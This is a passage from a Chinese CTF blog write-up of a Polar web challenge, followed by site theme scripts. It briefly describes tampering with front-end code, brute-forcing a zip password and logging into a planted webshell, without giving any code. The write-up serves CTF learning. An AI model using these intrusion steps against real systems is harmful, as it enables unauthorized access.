+<h1 id="金币大挑战"><a href="#金币大挑战" class="headerlink" title="金币大挑战"></a>金币大挑战</h1><p>点进去之后是一个</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201185240252.png" alt="image-20260201185240252"></p>
+<p>这个最多按到20，这个应该是前端的题，看一下源码</p>
+<p>果然</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201185412209.png" alt="image-20260201185412209"></p>
+<p>直接改了然后到下一关</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201185436862.png" alt="image-20260201185436862"></p>
+<p>最下面有个文件</p>
+<p>解压还要密码提示我们是纯数字，卡这了</p>
+<p>后面知道这里得要工具，下了个zipperello</p>
+<p>密码是1170</p>
+<p>进去是一个Squirtle1170</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201190022515.png" alt="image-20260201190022515"></p>
+<p>又卡了，看了下wp这里有个马，在upload目录下，叫Squirtle.php</p>
+<p>密码就是我们刚才得到的文本，坑</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201190230277.png" alt="image-20260201190230277"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2026/03/02/hello-world/">Hello World</a></div><div class="item" id="next"></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Yu9991n9</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2"><span class="toc-text">到底给不给flag呢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99shell"><span class="toc-text">写shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%90%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%8D%E4%BB%87"><span class="toc-text">某个函数的复仇</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXe"><span class="toc-text">XXe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#blackmagic"><span class="toc-text">blackmagic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E6%9D%A5ping%E4%B8%80%E6%B3%A2%E5%95%8A"><span class="toc-text">再来ping一波啊</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11%EF%BC%88php%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89"><span class="toc-text">代码审计1（php原生类）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E9%A9%AC%E5%91%A2"><span class="toc-text">你的马呢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezphp"><span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpurl"><span class="toc-text">phpurl</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%80%BC-%E5%8F%96%E5%9D%80%E8%B5%8B%E5%80%BC"><span class="toc-text">随机值(取址赋值)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file"><span class="toc-text">file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#search"><span class="toc-text">search</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#play-game"><span class="toc-text">play game</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%8C%E7%8E%8B"><span class="toc-text">赌王</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coke%E7%9A%84%E7%99%BB%E5%BD%95"><span class="toc-text">coke的登录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bllbl-rce"><span class="toc-text">bllbl rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%9F%E5%81%87rce"><span class="toc-text">真假rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nukaka-ser2"><span class="toc-text">nukaka_ser2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E4%B9%9F%E7%8E%A9%E9%93%B2%E5%90%97"><span class="toc-text">你也玩铲吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#polarcms"><span class="toc-text">polarcms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Squirtle%E7%9A%84%E8%AE%BA%E5%9D%9B"><span class="toc-text">Squirtle的论坛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E7%8B%97%E5%AD%90%E7%9A%84%E8%88%94%E7%8B%97%E6%97%A5%E8%AE%B0"><span class="toc-text">黑狗子的舔狗日记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#polar%E5%BF%AB%E9%80%92"><span class="toc-text">polar快递</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84%E8%B7%B3%E8%BD%AC"><span class="toc-text">狗黑子的跳转</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#aa"><span class="toc-text">aa</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#polar-shop"><span class="toc-text">polar shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%91%E5%B8%81%E5%A4%A7%E6%8C%91%E6%88%98"><span class="toc-text">金币大挑战</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
